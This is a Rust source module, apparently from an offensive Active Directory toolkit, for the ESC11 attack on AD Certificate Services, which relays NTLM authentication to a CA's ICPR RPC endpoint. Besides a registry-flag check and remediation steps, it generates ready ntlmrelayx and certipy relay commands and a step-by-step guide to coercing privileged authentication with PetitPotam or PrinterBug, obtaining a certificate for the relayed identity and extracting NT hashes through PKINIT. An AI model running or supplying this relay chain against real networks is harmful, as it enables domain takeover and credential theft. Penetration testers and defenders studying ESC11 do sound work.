//! ESC11 — Relaying NTLM to ICPR (IForceCertificateRequirements / ICertPassage)
//!
//! ESC11 is the RPC equivalent of ESC8.  Instead of relaying NTLM credentials
//! to the HTTP-based Web Enrollment endpoint (`/certsrv`), the attacker relays
//! them to the **MS-ICPR** (ICertPassage) DCE/RPC endpoint exposed by the CA.
//!
//! The critical prerequisite is that the CA must have
//! `IF_ENFORCEENCRYPTICERTREQUEST` **disabled** (flag value `0` or absent from
//! `CertSvc` registry), meaning the RPC endpoint accepts unauthenticated or
//! NTLM-signed (not Kerberos / Negotiate with signing) connections.
//!
//! **Registry check:**
//! ```text
//! reg query \\<CA_HOST>\HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>
//!      /v InterfaceFlags
//! ```
//! If `InterfaceFlags & IF_ENFORCEENCRYPTICERTREQUEST (0x00000200) == 0` → **VULNERABLE**
//!
//! **Attack flow:**
//! 1. Coerce or wait for an authentication event from a privileged account
//!    (e.g. a domain computer account relaying via SMB → NTLM Type 1/2/3).
//! 2. Relay the NTLM authentication to the ICPR RPC endpoint of the CA.
//! 3. Submit a CSR on behalf of the relayed account.
//! 4. The CA issues a certificate for the relayed identity.
//! 5. Use the certificate for PKINIT → NT hash extraction.
//!
//! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)

use crate::error::Result;
use tracing::{info, warn};

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// `IF_ENFORCEENCRYPTICERTREQUEST` interface flag — when unset the RPC endpoint is relay-able
pub const IF_ENFORCEENCRYPTICERTREQUEST: u32 = 0x00000200;

/// ICPR well-known named pipe (reached via SMB IPC$)
pub const ICPR_NAMED_PIPE: &str = r"\PIPE\cert";

/// ICPR RPC interface UUID
pub const ICPR_RPC_UUID: &str = "91ae6020-9e3c-11cf-8d7c-00aa00c091be";

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// Configuration for ESC11 attack and detection
#[derive(Debug, Clone)]
pub struct Esc11Config {
    /// Hostname or IP of the Certificate Authority
    pub ca_host: String,
    /// CA common name (e.g. `corp-CA01`)
    pub ca_name: String,
    /// Certificate template to request
    pub template: String,
    /// UPN / SAM account name appearing in the relayed identity
    pub relayed_identity: String,
}

/// Result of an ESC11 vulnerability assessment
#[derive(Debug, Clone)]
pub struct Esc11VulnAssessment {
    /// True when `IF_ENFORCEENCRYPTICERTREQUEST` is absent / disabled
    pub is_vulnerable: bool,
    /// Raw `InterfaceFlags` value read from remote registry (None if unreadable)
    pub interface_flags: Option<u32>,
    /// Registry path that was checked
    pub registry_path: String,
    /// Exploitation guidance string
    pub exploitation_guide: String,
    /// Impacket / certipy relay command
    pub relay_command: String,
    /// Remediation steps
    pub remediation: String,
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC11 exploiter — NTLM relay to ICPR
pub struct Esc11Exploiter {
    config: Esc11Config,
}

impl Esc11Exploiter {
    /// Create a new ESC11 exploiter
    pub fn new(config: Esc11Config) -> Self {
        Self { config }
    }

    /// Assess the CA for ESC11 vulnerability.
    ///
    /// This is a **detection / guidance** method.  It reads the `InterfaceFlags`
    /// registry value from the remote CA via `proto::registry` (MS-RRP) if a
    /// registry session is provided, then produces remediation and exploitation
    /// guidance.
    ///
    /// For live exploitation the caller should:
    /// 1. Use `overthrone-relay` → HTTP relay chain pointed at the ICPR endpoint.
    /// 2. Coerce a privileged NTLM authentication event.
    /// 3. Relay via the NTLM relay handler configured with `Esc11RelayTarget`.
    pub async fn assess(&self) -> Result<Esc11VulnAssessment> {
        info!(
            "ESC11: Checking CA {} on host {} for IF_ENFORCEENCRYPTICERTREQUEST",
            self.config.ca_name, self.config.ca_host
        );

        let registry_path = format!(
            r"HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{}\InterfaceFlags",
            self.config.ca_name
        );

        // Without a live registry session, emit guidance
        warn!(
            "ESC11: Live registry read not performed — connect a RegistrySession to {} \
             and read '{}' to verify",
            self.config.ca_host, registry_path
        );

        let relay_command = self.generate_relay_command();
        let exploitation_guide = self.generate_exploitation_guide();

        Ok(Esc11VulnAssessment {
            is_vulnerable: false, // Unknown until verified via live registry read
            interface_flags: None,
            registry_path,
            exploitation_guide,
            relay_command,
            remediation: format!(
                "Enable IF_ENFORCEENCRYPTICERTREQUEST (0x{:08X}) on CA '{}':\n\
                 certutil -setreg CA\\InterfaceFlags +{}\n\
                 net stop certsvc && net start certsvc",
                IF_ENFORCEENCRYPTICERTREQUEST, self.config.ca_name, IF_ENFORCEENCRYPTICERTREQUEST
            ),
        })
    }

    /// Assess using a pre-read `InterfaceFlags` value (e.g. from a remote registry query)
    pub fn assess_from_flags(&self, interface_flags: u32) -> Esc11VulnAssessment {
        let is_vulnerable = (interface_flags & IF_ENFORCEENCRYPTICERTREQUEST) == 0;

        let registry_path = format!(
            r"HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{}\InterfaceFlags",
            self.config.ca_name
        );

        if is_vulnerable {
            info!(
                "ESC11: CA '{}' is VULNERABLE — InterfaceFlags=0x{:08X}, \
                 IF_ENFORCEENCRYPTICERTREQUEST is NOT set",
                self.config.ca_name, interface_flags
            );
        }

        Esc11VulnAssessment {
            is_vulnerable,
            interface_flags: Some(interface_flags),
            registry_path,
            exploitation_guide: self.generate_exploitation_guide(),
            relay_command: self.generate_relay_command(),
            remediation: format!(
                "Set InterfaceFlags |= 0x{:08X} on CA '{}' and restart CertSvc",
                IF_ENFORCEENCRYPTICERTREQUEST, self.config.ca_name
            ),
        }
    }

    fn generate_relay_command(&self) -> String {
        format!(
            "# ESC11 — Relay NTLM to ICPR endpoint on {}\n\
             # Impacket-based relay to CA RPC:\n\
             ntlmrelayx.py -t rpc://{} -rpc-mode ICPR -icpr-ca-name '{}' \\\n\
             \t--adcs --template '{}'\n\
             # Or with certipy:\n\
             certipy relay -ca {} -template '{}' -target rpc://{}",
            self.config.ca_host,
            self.config.ca_host,
            self.config.ca_name,
            self.config.template,
            self.config.ca_name,
            self.config.template,
            self.config.ca_host,
        )
    }

    fn generate_exploitation_guide(&self) -> String {
        format!(
            "ESC11 Exploitation Guide for CA '{}' @ {}\n\
             \n\
             Prerequisites:\n\
             - InterfaceFlags does NOT have 0x{:08X} set (verified via registry)\n\
             - Ability to coerce authentication from a privileged account\n\
             \n\
             Steps:\n\
             1. Start NTLM relay listener targeting rpc://{}\n\
             2. Coerce authentication from privileged account (PetitPotam, PrinterBug, etc.)\n\
             3. Relay captures NTLM Type1 → relays to ICPR named pipe ({})\n\
             4. Submit CSR with template '{}' for relayed identity\n\
             5. Certificate issued → use for PKINIT to extract NT hash\n\
             \n\
             Post-exploitation: certipy auth -pfx <issued.pfx> -dc-ip <DC_IP>",
            self.config.ca_name,
            self.config.ca_host,
            IF_ENFORCEENCRYPTICERTREQUEST,
            self.config.ca_host,
            ICPR_NAMED_PIPE,
            self.config.template,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_if_enforceencrypticertrequest_value() {
        assert_eq!(IF_ENFORCEENCRYPTICERTREQUEST, 0x00000200);
    }

    #[test]
    fn test_assess_from_flags_vulnerability_detection() {
        let config = Esc11Config {
            ca_host: "192.168.1.10".to_string(),
            ca_name: "corp-CA01".to_string(),
            template: "User".to_string(),
            relayed_identity: "DC01$".to_string(),
        };
        let exploiter = Esc11Exploiter::new(config);

        // Flags without the bit → vulnerable
        let vuln = exploiter.assess_from_flags(0x00000000);
        assert!(vuln.is_vulnerable);
        assert_eq!(vuln.interface_flags, Some(0x00000000));

        // Flags with the bit → not vulnerable
        let safe = exploiter.assess_from_flags(0x00000200);
        assert!(!safe.is_vulnerable);
    }

    #[test]
    fn test_relay_command_contains_ca_info() {
        let config = Esc11Config {
            ca_host: "10.10.0.5".to_string(),
            ca_name: "lab-CA".to_string(),
            template: "Machine".to_string(),
            relayed_identity: "WORKSTATION$".to_string(),
        };
        let exploiter = Esc11Exploiter::new(config);
        let cmd = exploiter.generate_relay_command();
        assert!(cmd.contains("10.10.0.5"));
        assert!(cmd.contains("lab-CA"));
        assert!(cmd.contains("Machine"));
    }

    #[test]
    fn test_icpr_named_pipe() {
        assert!(ICPR_NAMED_PIPE.contains("cert"));
    }
}
